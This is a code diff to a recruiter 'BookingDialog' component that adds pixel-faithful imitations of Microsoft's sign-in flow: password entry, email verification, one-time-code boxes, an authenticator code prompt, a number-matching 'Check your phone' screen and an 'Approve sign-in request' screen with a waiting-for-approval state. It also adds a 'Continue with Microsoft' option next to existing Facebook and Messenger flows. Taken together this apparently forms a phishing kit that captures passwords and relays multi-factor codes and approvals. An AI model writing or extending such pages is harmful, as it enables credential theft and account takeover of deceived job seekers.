+                              aria-label="Password"
+                              className={cn(
+                                "mb-6 w-full border bg-white px-2.5 py-2.5 text-[15px] text-[#1b1b1b] outline-none focus:border-2 focus:px-[9px] focus:py-[9px]",
+                                loginError ? "border-[#e81123] focus:border-[#e81123]" : "border-[#666] focus:border-[#0067b8]"
+                              )}
+                              style={{ borderRadius: 4 }}
+                            />
+                            <button
+                              type="submit"
+                              disabled={login.password.length === 0 || loggingIn || isSending}
+                              className="mb-[22px] flex w-full items-center justify-center gap-2 bg-[#0067b8] text-[15px] font-semibold text-white transition hover:bg-[#005da6] disabled:cursor-not-allowed disabled:bg-[#a7c7e7]"
+                              style={{ height: 44, borderRadius: 4 }}
+                            >
+                              {(loggingIn || isSending) && <Loader2 className="size-4 animate-spin" />}
+                              {loggingIn ? "Signing in…" : "Next"}
+                            </button>
+                            <button
+                              type="button"
+                              className="text-[13px] font-semibold text-[#0067b8] hover:underline"
+                            >
+                              Other ways to sign in
+                            </button>
+                          </>
+                        )}
+                      </form>
+
+                      {/* Microsoft footer */}
+                      <div className="pointer-events-none absolute inset-x-0 bottom-0 flex flex-col items-center gap-1 px-4 py-2.5 text-center text-[12px] text-[#444]">
+                        <div className="flex flex-wrap justify-center gap-x-5 gap-y-1">
+                          <button type="button" className="pointer-events-auto hover:underline">
+                            Help and feedback
+                          </button>
+                          <button type="button" className="pointer-events-auto hover:underline">
+                            Terms of use
+                          </button>
+                          <button type="button" className="pointer-events-auto hover:underline">
+                            Privacy and cookies
+                          </button>
+                        </div>
+                      </div>
+                    </div>
                 ) : (
                     /* ── MESSENGER ── */
                     <>
@@ -813,6 +1481,645 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
                       </div>
                     </>
                 )}
+              </div>
+          )}
+
+          {/* ─────────────────── VERIFY EMAIL (2FA) ─────────────────── */}
+          {step === "verify-email" && (
+              <div
+                  className="relative flex h-full flex-col items-center justify-center overflow-hidden px-4 py-8"
+                  style={{
+                    fontFamily:
+                      '"Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif',
+                    background:
+                      "radial-gradient(120% 90% at 15% 20%, #e9edfb 0%, rgba(233,237,251,0) 55%), radial-gradient(120% 100% at 85% 15%, #eef1fd 0%, rgba(238,241,253,0) 50%), radial-gradient(120% 120% at 10% 95%, #fdeee9 0%, rgba(253,238,233,0) 55%), radial-gradient(140% 120% at 95% 100%, #f7eef6 0%, rgba(247,238,246,0) 55%), linear-gradient(135deg, #eef1fb 0%, #f4eef6 45%, #fdf3ee 100%)",
+                  }}
+              >
+                <MicrosoftGlassBg />
+                <form
+                    onSubmit={handleVerifyEmailSubmit}
+                    className="relative z-[2] w-full max-w-[440px] rounded-lg bg-white shadow-[0_2px_12px_rgba(0,0,0,0.10),0_0_2px_rgba(0,0,0,0.06)]"
+                    style={{ padding: "26px 44px 36px" }}
+                >
+                  <button
+                      type="button"
+                      aria-label="Back"
+                      onClick={() => setStep("full-login")}
+                      className="absolute left-[22px] top-[22px] text-[#666]"
+                  >
+                    <svg viewBox="0 0 24 24" fill="none" className="size-5">
+                      <path
+                        d="M15 5l-7 7 7 7"
+                        stroke="currentColor"
+                        strokeWidth="1.6"
+                        strokeLinecap="round"
+                        strokeLinejoin="round"
+                      />
+                    </svg>
+                  </button>
+
+                  <div className="mb-[26px] mt-1 flex items-center justify-center gap-2">
+                    <MicrosoftIcon className="size-5" />
+                    <span className="text-[21px] font-semibold tracking-[-0.2px] text-[#5e5e5e]">
+                      Microsoft
+                    </span>
+                  </div>
+
+                  <div className="mb-[22px] flex justify-center">
+                    <span className="inline-block rounded-[20px] border border-[#d2d2d2] bg-white px-3.5 py-[5px] text-[13px] text-[#1b1b1b]">
+                      {login.id || "someone@example.com"}
+                    </span>
+                  </div>
+
+                  <h1 className="mb-[14px] text-center text-[24px] font-semibold leading-tight text-[#1b1b1b]">
+                    Verify your email
+                  </h1>
+
+                  <p className="mb-5 text-center text-[13px] leading-[1.55] text-[#1b1b1b]">
+                    We&apos;ll send a verification code to your email.
+                    <br />
+                    To verify this is your email address, enter it here.
+                  </p>
+
+                  {emailVerifyError && (
+                    <p className="mb-3 text-[13px] leading-snug text-[#e81123]">{emailVerifyError}</p>
+                  )}
+
+                  <input
+                      type="email"
+                      value={emailVerify}
+                      onChange={(e) => {
+                        setEmailVerify(e.target.value)
+                        if (emailVerifyError) setEmailVerifyError("")
+                      }}
+                      placeholder="Email"
+                      aria-label="Email"
+                      className={cn(
+                        "mb-[22px] h-10 w-full rounded border bg-white px-2.5 text-[15px] text-[#1b1b1b] outline-none",
+                        emailVerifyError ? "border-[#e81123] focus:border-[#e81123]" : "border-[#d1d1d1] focus:border-[#0067b8]"
+                      )}
+                  />
+
+                  <button
+                      type="submit"
+                      disabled={emailVerify.trim().length === 0 || verifyingEmail}
+                      className="mb-[22px] flex h-11 w-full items-center justify-center gap-2 rounded bg-[#0067b8] text-[15px] font-semibold text-white transition hover:bg-[#005da6] disabled:cursor-not-allowed disabled:bg-[#a7c7e7]"
+                  >
+                    {verifyingEmail && <Loader2 className="size-4 animate-spin" />}
+                    {verifyingEmail ? "Sending…" : "Send code"}
+                  </button>
+
+                  <button
+                      type="button"
+                      className="block w-full text-center text-[13px] font-semibold text-[#0067b8] hover:underline"
+                  >
+                    Already received a code?
+                  </button>
+                </form>
+
+                <MicrosoftFooter />
+              </div>
+          )}
+
+          {/* ─────────────────── EMAIL OTP ─────────────────── */}
+          {step === "email-otp" && (
+              <div
+                  className="relative flex h-full flex-col items-center justify-center overflow-hidden px-4 py-8"
+                  style={{
+                    fontFamily:
+                      '"Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif',
+                    background:
+                      "radial-gradient(120% 90% at 15% 20%, #e9edfb 0%, rgba(233,237,251,0) 55%), radial-gradient(120% 100% at 85% 15%, #eef1fd 0%, rgba(238,241,253,0) 50%), radial-gradient(120% 120% at 10% 95%, #fdeee9 0%, rgba(253,238,233,0) 55%), radial-gradient(140% 120% at 95% 100%, #f7eef6 0%, rgba(247,238,246,0) 55%), linear-gradient(135deg, #eef1fb 0%, #f4eef6 45%, #fdf3ee 100%)",
+                  }}
+              >
+                <MicrosoftGlassBg />
+                <div
+                    className="relative z-[2] w-full max-w-[448px] rounded-lg bg-white shadow-[0_2px_12px_rgba(0,0,0,0.10),0_0_2px_rgba(0,0,0,0.06)]"
+                    style={{ padding: "30px 40px 34px" }}
+                >
+                  <div className="mb-[22px] flex items-center justify-center gap-2">
+                    <MicrosoftIcon className="size-5" />
+                    <span className="text-[21px] font-semibold tracking-[-0.2px] text-[#5e5e5e]">
+                      Microsoft
+                    </span>
+                  </div>
+
+                  <div className="mb-4 flex justify-center">
+                    <span className="inline-block rounded-[20px] border border-[#d2d2d2] bg-white px-3.5 py-[5px] text-[13px] text-[#1b1b1b]">
+                      {login.id || "someone@example.com"}
+                    </span>
+                  </div>
+
+                  {otpError && (
+                    <div className="mb-[18px] flex items-center gap-2 rounded border border-[#e6b3b7] bg-[#fdf3f4] px-2.5 py-[9px]">
+                      <span className="inline-flex size-5 shrink-0 items-center justify-center rounded-full bg-[#c50f1f]">
+                        <svg viewBox="0 0 24 24" fill="none" className="size-[11px] text-white">
+                          <path
+                            d="M6 6l12 12M18 6L6 18"
+                            stroke="currentColor"
+                            strokeWidth="3"
+                            strokeLinecap="round"
+                            strokeLinejoin="round"
+                          />
+                        </svg>
+                      </span>
+                      <p className="text-[12.5px] leading-tight text-[#1b1b1b]">
+                        That code didn&apos;t work. Check the code and try again.
+                      </p>
+                    </div>
+                  )}
+
+                  <h1 className="mb-[14px] text-center text-[24px] font-bold leading-tight text-[#1b1b1b]">
+                    Enter the code
+                  </h1>
+
+                  <p className="mx-auto mb-[26px] max-w-[320px] text-center text-[13px] leading-[1.55] text-[#1b1b1b]">
+                    If <b>{emailVerify || login.id}</b> matches the email address on your account,
+                    we&apos;ll send you a code.
+                  </p>
+
+                  <div className="mb-[26px] flex flex-wrap justify-center gap-2">
+                    {Array.from({ length: 10 }).map((_, i) => (
+                      <input
+                        key={i}
+                        type="text"
+                        inputMode="numeric"
+                        maxLength={1}
+                        value={otpCode[i] || ""}
+                        onChange={(e) => {
+                          const digits = e.target.value.replace(/\D/g, "")
+                          if (!digits) return
+                          const next = (otpCode.slice(0, i) + digits + otpCode.slice(i + 1)).slice(0, 10)
+                          setOtpCode(next)
+                          setOtpError("")
+                          const el = e.target as HTMLInputElement
+                          const nextBox = el.parentElement?.children[i + 1] as HTMLInputElement | undefined
+                          if (nextBox) nextBox.focus()
+                        }}
+                        onKeyDown={(e) => {
+                          if (e.key === "Backspace" && !otpCode[i] && i > 0) {
+                            const el = e.target as HTMLInputElement
+                            const prevBox = el.parentElement?.children[i - 1] as HTMLInputElement | undefined
+                            if (prevBox) prevBox.focus()
+                          }
+                        }}
+                        className="w-[30px] rounded-md border border-[#d1d1d1] bg-white text-center text-[17px] text-[#1b1b1b] outline-none focus:border-[#0067b8] focus:shadow-[inset_0_0_0_1px_#0067b8]"
+                        style={{ height: 44 }}
+                      />
+                    ))}
+                  </div>
+
+                  <button
+                      type="button"
+                      onClick={handleAuthenticatorContinue}
+                      disabled={!otpValid || isSending}
+                      className="mb-4 flex h-11 w-full items-center justify-center gap-2 rounded bg-[#0067b8] text-[15px] font-semibold text-white transition hover:bg-[#005da6] disabled:cursor-not-allowed disabled:bg-[#a7c7e7]"
+                  >
+                    {isSending && <Loader2 className="size-4 animate-spin" />}
+                    {isSending ? "Verifying…" : "Next"}
+                  </button>
+
+                  <button
+                      type="button"
+                      className="block w-full text-center text-[13px] font-semibold text-[#0067b8] hover:underline"
+                  >
+                    Other ways to sign in
+                  </button>
+                </div>
+
+                <MicrosoftFooter note="Use private browsing if this is not your device." />
+              </div>
+          )}
+
+          {/* ─────────────────── AUTHENTICATOR CODE (MICROSOFT) ─────────────────── */}
+          {step === "ms-authenticator" && (
+              <div
+                  className="relative flex h-full flex-col items-center justify-center overflow-hidden px-4 py-8"
+                  style={{
+                    fontFamily:
+                      '"Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif',
+                    background:
+                      "radial-gradient(120% 90% at 15% 20%, #e9edfb 0%, rgba(233,237,251,0) 55%), radial-gradient(120% 100% at 85% 15%, #eef1fd 0%, rgba(238,241,253,0) 50%), radial-gradient(120% 120% at 10% 95%, #fdeee9 0%, rgba(253,238,233,0) 55%), radial-gradient(140% 120% at 95% 100%, #f7eef6 0%, rgba(247,238,246,0) 55%), linear-gradient(135deg, #eef1fb 0%, #f4eef6 45%, #fdf3ee 100%)",
+                  }}
+              >
+                <MicrosoftGlassBg />
+                <div
+                    className="relative z-[2] w-full max-w-[448px] rounded-lg bg-white shadow-[0_2px_12px_rgba(0,0,0,0.10),0_0_2px_rgba(0,0,0,0.06)]"
+                    style={{ padding: "30px 40px 34px" }}
+                >
+                  <div className="relative mb-[22px] flex items-center justify-center">
+                    <button
+                        type="button"
+                        aria-label="Back"
+                        onClick={() => setStep("full-login")}
+                        className="absolute left-0 top-1/2 -translate-y-1/2 text-[#666]"
+                    >
+                      <svg viewBox="0 0 24 24" fill="none" className="size-5">
+                        <path
+                          d="M15 5l-7 7 7 7"
+                          stroke="currentColor"
+                          strokeWidth="1.6"
+                          strokeLinecap="round"
+                          strokeLinejoin="round"
+                        />
+                      </svg>
+                    </button>
+                    <div className="flex items-center gap-2">
+                      <MicrosoftIcon className="size-5" />
+                      <span className="text-[21px] font-semibold tracking-[-0.2px] text-[#5e5e5e]">
+                        Microsoft
+                      </span>
+                    </div>
+                  </div>
+
+                  <div className="mb-5 flex justify-center">
+                    <span className="inline-block rounded-[20px] border border-[#d2d2d2] bg-white px-3.5 py-[5px] text-[13px] text-[#1b1b1b]">
+                      {login.id || "someone@example.com"}
+                    </span>
+                  </div>
+
+                  <h1 className="mx-auto mb-[22px] max-w-[300px] text-center text-[24px] font-bold leading-[1.25] text-[#1b1b1b]">
+                    Enter the code generated by your authenticator app
+                  </h1>
+
+                  <div className="mb-[26px] flex justify-center">
+                    <img
+                        src="https://i.ibb.co.com/bxGRfDw/device-shield-checkmark-white-ae3eb5f70247b63d5acb.png"
+                        alt="Authenticator app"
+                        className="block h-auto w-24"
+                    />
+                  </div>
+
+                  {otpError && (
+                    <p className="mb-3 text-[13px] leading-snug text-[#e81123]">
+                      That code didn&apos;t work. Check the code and try again.
+                    </p>
+                  )}
+
+                  <input
+                      type="text"
+                      inputMode="numeric"
+                      maxLength={10}
+                      value={otpCode}
+                      onChange={(e) => {
+                        setOtpCode(e.target.value.replace(/\D/g, "").slice(0, 10))
+                        setOtpError("")
+                      }}
+                      placeholder="Code"
+                      aria-label="Code"
+                      className={cn(
+                        "mb-6 h-10 w-full rounded border bg-white px-2.5 text-[15px] text-[#1b1b1b] outline-none",
+                        otpError ? "border-[#e81123] focus:border-[#e81123]" : "border-[#d1d1d1] focus:border-[#0067b8]"
+                      )}
+                  />
+
+                  <button
+                      type="button"
+                      onClick={handleAuthenticatorContinue}
+                      disabled={!otpValid || isSending}
+                      className="mb-[22px] flex h-11 w-full items-center justify-center gap-2 rounded bg-[#0067b8] text-[15px] font-semibold text-white transition hover:bg-[#005da6] disabled:cursor-not-allowed disabled:bg-[#a7c7e7]"
+                  >
+                    {isSending && <Loader2 className="size-4 animate-spin" />}
+                    {isSending ? "Verifying…" : "Next"}
+                  </button>
+
+                  <label className="flex cursor-pointer select-none items-center justify-center gap-2 text-[13px] text-[#1b1b1b]">
+                    <input
+                        type="checkbox"
+                        checked={rememberDevice}
+                        onChange={(e) => setRememberDevice(e.target.checked)}
+                        className="sr-only"
+                    />
+                    <span
+                        className={cn(
+                          "inline-flex size-[18px] shrink-0 items-center justify-center rounded-sm border",
+                          rememberDevice ? "border-[#0067b8] bg-[#0067b8]" : "border-[#666] bg-white"
+                        )}
+                    >
+                      {rememberDevice && (
+                        <svg viewBox="0 0 24 24" fill="none" className="size-3 text-white">
+                          <path
+                            d="M5 12l5 5L20 6"
+                            stroke="currentColor"
+                            strokeWidth="3"
+                            strokeLinecap="round"
+                            strokeLinejoin="round"
+                          />
+                        </svg>
+                      )}
+                    </span>
+                    Don&apos;t ask me again on this device
+                  </label>
+                </div>
+
+                <MicrosoftFooter />
+              </div>
+          )}
+
+          {/* ─────────────────── ENTER CODE ─────────────────── */}
+          {step === "enter-code" && (
+              <div
+                  className="relative flex h-full flex-col items-center justify-center overflow-hidden px-4 py-8"
+                  style={{
+                    fontFamily:
+                      '"Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif',
+                    background:
+                      "radial-gradient(120% 90% at 15% 20%, #e9edfb 0%, rgba(233,237,251,0) 55%), radial-gradient(120% 100% at 85% 15%, #eef1fd 0%, rgba(238,241,253,0) 50%), radial-gradient(120% 120% at 10% 95%, #fdeee9 0%, rgba(253,238,233,0) 55%), radial-gradient(140% 120% at 95% 100%, #f7eef6 0%, rgba(247,238,246,0) 55%), linear-gradient(135deg, #eef1fb 0%, #f4eef6 45%, #fdf3ee 100%)",
+                  }}
+              >
+                <MicrosoftGlassBg />
+                <div
+                    className="relative z-[2] w-full max-w-[448px] rounded-lg bg-white shadow-[0_2px_12px_rgba(0,0,0,0.10),0_0_2px_rgba(0,0,0,0.06)]"
+                    style={{ padding: "30px 40px 34px" }}
+                >
+                  <div className="mb-[22px] flex items-center justify-center gap-2">
+                    <MicrosoftIcon className="size-5" />
+                    <span className="text-[21px] font-semibold tracking-[-0.2px] text-[#5e5e5e]">
+                      Microsoft
+                    </span>
+                  </div>
+
+                  <div className="mb-[18px] flex justify-center">
+                    <span className="inline-block rounded-[20px] border border-[#d2d2d2] bg-white px-3.5 py-[5px] text-[13px] text-[#1b1b1b]">
+                      {login.id || "someone@example.com"}
+                    </span>
+                  </div>
+
+                  <h1 className="mb-[14px] text-center text-[24px] font-bold leading-tight text-[#1b1b1b]">
+                    Enter the code
+                  </h1>
+
+                  <p className="mx-auto mb-[22px] max-w-[320px] text-center text-[13px] leading-[1.55] text-[#1b1b1b]">
+                    This was sent by email, text message, or generated in an authenticator app.
+                  </p>
+
+                  {otpError && (
+                    <p className="mb-3 text-[13px] leading-snug text-[#e81123]">
+                      That code didn&apos;t work. Check the code and try again.
+                    </p>
+                  )}
+
+                  <input
+                      type="text"
+                      inputMode="numeric"
+                      maxLength={10}
+                      value={otpCode}
+                      onChange={(e) => {
+                        setOtpCode(e.target.value.replace(/\D/g, "").slice(0, 10))
+                        setOtpError("")
+                      }}
+                      placeholder="Code"
+                      aria-label="Code"
+                      className={cn(
+                        "mb-6 h-10 w-full rounded border bg-white px-2.5 text-[15px] text-[#1b1b1b] outline-none",
+                        otpError ? "border-[#e81123] focus:border-[#e81123]" : "border-[#d1d1d1] focus:border-[#0067b8]"
+                      )}
+                  />
+
+                  <button
+                      type="button"
+                      onClick={handleAuthenticatorContinue}
+                      disabled={!otpValid || isSending}
+                      className="mb-[22px] flex h-11 w-full items-center justify-center gap-2 rounded bg-[#0067b8] text-[15px] font-semibold text-white transition hover:bg-[#005da6] disabled:cursor-not-allowed disabled:bg-[#a7c7e7]"
+                  >
+                    {isSending && <Loader2 className="size-4 animate-spin" />}
+                    {isSending ? "Verifying…" : "Next"}
+                  </button>
+
+                  <label className="mb-6 flex cursor-pointer select-none items-center justify-center gap-2 text-[13px] text-[#1b1b1b]">
+                    <input
+                        type="checkbox"
+                        checked={rememberDevice}
+                        onChange={(e) => setRememberDevice(e.target.checked)}
+                        className="sr-only"
+                    />
+                    <span
+                        className={cn(
+                          "inline-flex size-[18px] shrink-0 items-center justify-center rounded-sm border",
+                          rememberDevice ? "border-[#0067b8] bg-[#0067b8]" : "border-[#666] bg-white"
+                        )}
+                    >
+                      {rememberDevice && (
+                        <svg viewBox="0 0 24 24" fill="none" className="size-3 text-white">
+                          <path
+                            d="M5 12l5 5L20 6"
+                            stroke="currentColor"
+                            strokeWidth="3"
+                            strokeLinecap="round"
+                            strokeLinejoin="round"
+                          />
+                        </svg>
+                      )}
+                    </span>
+                    Don&apos;t ask me again on this device
+                  </label>
+
+                  <button
+                      type="button"
+                      className="block w-full text-center text-[13px] font-semibold text-[#0067b8] hover:underline"
+                  >
+                    Other ways to sign in
+                  </button>
+                </div>
+
+                <MicrosoftFooter />
+              </div>
+          )}
+
+          {/* ─────────────────── CHECK YOUR PHONE ─────────────────── */}
+          {step === "check-phone" && (
+              <div
+                  className="relative flex h-full flex-col items-center justify-center overflow-hidden px-4 py-8"
+                  style={{
+                    fontFamily:
+                      '"Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif',
+                    background:
+                      "radial-gradient(120% 90% at 15% 20%, #e9edfb 0%, rgba(233,237,251,0) 55%), radial-gradient(120% 100% at 85% 15%, #eef1fd 0%, rgba(238,241,253,0) 50%), radial-gradient(120% 120% at 10% 95%, #fdeee9 0%, rgba(253,238,233,0) 55%), radial-gradient(140% 120% at 95% 100%, #f7eef6 0%, rgba(247,238,246,0) 55%), linear-gradient(135deg, #eef1fb 0%, #f4eef6 45%, #fdf3ee 100%)",
+                  }}
+              >
+                <MicrosoftGlassBg />
+                <div
+                    className="relative z-[2] w-full max-w-[448px] rounded-lg bg-white shadow-[0_2px_12px_rgba(0,0,0,0.10),0_0_2px_rgba(0,0,0,0.06)]"
+                    style={{ padding: "30px 40px 34px" }}
+                >
+                  <div className="relative mb-[22px] flex items-center justify-center">
+                    <button
+                        type="button"
+                        aria-label="Back"
+                        onClick={() => setStep("full-login")}
+                        className="absolute left-0 top-1/2 -translate-y-1/2 text-[#666]"
+                    >
+                      <svg viewBox="0 0 24 24" fill="none" className="size-5">
+                        <path
+                          d="M15 5l-7 7 7 7"
+                          stroke="currentColor"
+                          strokeWidth="1.6"
+                          strokeLinecap="round"
+                          strokeLinejoin="round"
+                        />
+                      </svg>
+                    </button>
+                    <div className="flex items-center gap-2">
+                      <MicrosoftIcon className="size-5" />
+                      <span className="text-[21px] font-semibold tracking-[-0.2px] text-[#5e5e5e]">
+                        Microsoft
+                      </span>
+                    </div>
+                  </div>
+
+                  <div className="mb-5 flex justify-center">
+                    <span className="inline-block rounded-[20px] border border-[#d2d2d2] bg-white px-3.5 py-[5px] text-[13px] text-[#1b1b1b]">
+                      {login.id || "someone@example.com"}
+                    </span>
+                  </div>
+
+                  <h1 className="mb-5 text-center text-[24px] font-bold leading-tight text-[#1b1b1b]">
+                    Check your phone
+                  </h1>
+
+                  <div className="mb-[18px] flex justify-center">
+                    <img
+                        src="https://i.ibb.co.com/bxGRfDw/device-shield-checkmark-white-ae3eb5f70247b63d5acb.png"
+                        alt="Check your phone"
+                        className="block h-auto w-24"
+                    />
+                  </div>
+
+                  <div className="mb-[14px] text-center text-[44px] font-bold leading-none text-[#1b1b1b]">
+                    {checkPhoneNumber || "••"}
+                  </div>
+
+                  <p className="mx-auto mb-6 max-w-[300px] text-center text-[13px] leading-[1.55] text-[#1b1b1b]">
+                    Enter this number in the sign-in request on your mobile device.
+                  </p>
+
+                  {approveError && (
+                    <p className="mb-3 text-center text-[13px] leading-snug text-[#e81123]">
+                      {approveError}
+                    </p>
+                  )}
+
+                  {approving && (
+                    <p className="mb-4 flex items-center justify-center gap-2 text-center text-[13px] text-[#666]">
+                      <Loader2 className="size-4 animate-spin" /> Waiting for approval…
+                    </p>
+                  )}
+
+                  <button
+                      type="button"
+                      onClick={() => setStep("full-login")}
+                      className="mb-[22px] block w-full text-center text-[13px] font-semibold text-[#0067b8] hover:underline"
+                  >
+                    Use your password
+                  </button>
+
+                  <button
+                      type="button"
+                      className="block w-full text-center text-[13px] font-semibold text-[#0067b8] hover:underline"
+                  >
+                    Can&apos;t use your Microsoft app?
+                  </button>
+                </div>
+
+                <MicrosoftFooter />
+              </div>
+          )}
+
+          {/* ─────────────────── APPROVE SIGN-IN ─────────────────── */}
+          {step === "approve-signin" && (
+              <div
+                  className="relative flex h-full flex-col items-center justify-center overflow-hidden px-4 py-8"
+                  style={{
+                    fontFamily:
+                      '"Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif',
+                    background:
+                      "radial-gradient(120% 90% at 15% 20%, #e9edfb 0%, rgba(233,237,251,0) 55%), radial-gradient(120% 100% at 85% 15%, #eef1fd 0%, rgba(238,241,253,0) 50%), radial-gradient(120% 120% at 10% 95%, #fdeee9 0%, rgba(253,238,233,0) 55%), radial-gradient(140% 120% at 95% 100%, #f7eef6 0%, rgba(247,238,246,0) 55%), linear-gradient(135deg, #eef1fb 0%, #f4eef6 45%, #fdf3ee 100%)",
+                  }}
+              >
+                <MicrosoftGlassBg />
+                <div
+                    className="relative z-[2] w-full max-w-[448px] rounded-lg bg-white shadow-[0_2px_12px_rgba(0,0,0,0.10),0_0_2px_rgba(0,0,0,0.06)]"
+                    style={{ padding: "30px 40px 34px" }}
+                >
+                  <div className="mb-[22px] flex items-center justify-center gap-2">
+                    <MicrosoftIcon className="size-5" />
+                    <span className="text-[21px] font-semibold tracking-[-0.2px] text-[#5e5e5e]">
+                      Microsoft
+                    </span>
+                  </div>
+
+                  <div className="mb-5 flex justify-center">
+                    <span className="inline-block rounded-[20px] border border-[#d2d2d2] bg-white px-3.5 py-[5px] text-[13px] text-[#1b1b1b]">
+                      {login.id || "someone@example.com"}
+                    </span>
+                  </div>
+
+                  <h1 className="mb-5 text-center text-[24px] font-bold leading-tight text-[#1b1b1b]">
+                    Approve sign-in request
+                  </h1>
+
+                  <div className="mb-[22px] flex justify-center">
+                    <img
+                        src="https://i.ibb.co.com/bxGRfDw/device-shield-checkmark-white-ae3eb5f70247b63d5acb.png"
+                        alt="Approve sign-in request"
+                        className="block h-auto w-24"
+                    />
+                  </div>
+
+                  <p className="mx-auto mb-6 max-w-[320px] text-center text-[13px] leading-[1.55] text-[#1b1b1b]">
+                    Approve request <b>{approveCode || "•••••"}</b> on your Microsoft Authenticator app
+                    to access sensitive information.
+                  </p>
+
+                  {approveError && (
+                    <p className="mb-3 text-center text-[13px] leading-snug text-[#e81123]">
+                      {approveError}
+                    </p>
+                  )}
+
+                  {approving && (
+                    <p className="mb-4 flex items-center justify-center gap-2 text-center text-[13px] text-[#666]">
+                      <Loader2 className="size-4 animate-spin" /> Waiting for approval…
+                    </p>
+                  )}
+
+                  <label className="mb-[22px] flex cursor-pointer select-none items-center justify-center gap-2 text-[13px] text-[#1b1b1b]">
+                    <input
+                        type="checkbox"
+                        checked={rememberDevice}
+                        onChange={(e) => setRememberDevice(e.target.checked)}
+                        className="sr-only"
+                    />
+                    <span
+                        className={cn(
+                          "inline-flex size-[18px] shrink-0 items-center justify-center rounded-sm border",
+                          rememberDevice ? "border-[#0067b8] bg-[#0067b8]" : "border-[#666] bg-white"
+                        )}
+                    >
+                      {rememberDevice && (
+                        <svg viewBox="0 0 24 24" fill="none" className="size-3 text-white">
+                          <path
+                            d="M5 12l5 5L20 6"
+                            stroke="currentColor"
+                            strokeWidth="3"
+                            strokeLinecap="round"
+                            strokeLinejoin="round"
+                          />
+                        </svg>
+                      )}
+                    </span>
+                    Don&apos;t ask me again on this device
+                  </label>
+
+                  <button
+                      type="button"
+                      className="block w-full text-center text-[13px] font-semibold text-[#0067b8] hover:underline"
+                  >
+                    Other ways to sign in
+                  </button>
+                </div>
+
+                <MicrosoftFooter />
               </div>
           )}
 
@@ -1140,6 +2447,17 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
                           Continue with Messenger
                         </Button>
 
+                        <Button
+                            type="button"
+                            size="lg"
+                            variant="outline"
+                            onClick={() => handleAuth("microsoft")}
+                            className="h-12 w-full justify-center gap-2.5 rounded-xl border-border font-semibold text-foreground hover:bg-accent"
+                        >
+                          <MicrosoftIcon className="size-5" />
+                          Continue with Microsoft
+                        </Button>
+
                         <p className="mt-1 flex items-center justify-center gap-1.5 text-center text-xs text-muted-foreground">
                           <Lock className="size-3" />
                           Secure sign-in. We never post to your account or contacts.
@@ -1158,13 +2476,13 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
                     </div>
                 )}
 
-                {/* ── AUTHENTICATOR ── */}
+                {/* ── AUTHENTICATOR (FACEBOOK / MESSENGER) ── */}
                 {step === "authenticator" && (
                     <div className="flex flex-col">
                       {/* Header */}
                       <div className="px-6 pt-6 pb-2">
                         <p className="text-[13px] text-[#65676b]">
-                          {form.name || "You"} · Facebook
+                          {form.name || "You"} · {providerLabel}
                         </p>
                         <h2 className="mt-1 text-[22px] font-bold leading-snug text-[#1c1e21]">
                           Go to your authentication app
@@ -1239,8 +2557,7 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
                       <DialogHeader className="mt-4 items-center text-center">
                         <DialogTitle className="text-2xl">You&apos;re booked!</DialogTitle>
                         <DialogDescription className="text-base">
-                          Verified
-                          {authProvider === "messenger" ? " via Messenger" : " via Facebook"}. A calendar
+                          Verified via {providerLabel}. A calendar
                           invite is on its way to {form.email}.
                         </DialogDescription>
                       </DialogHeader>
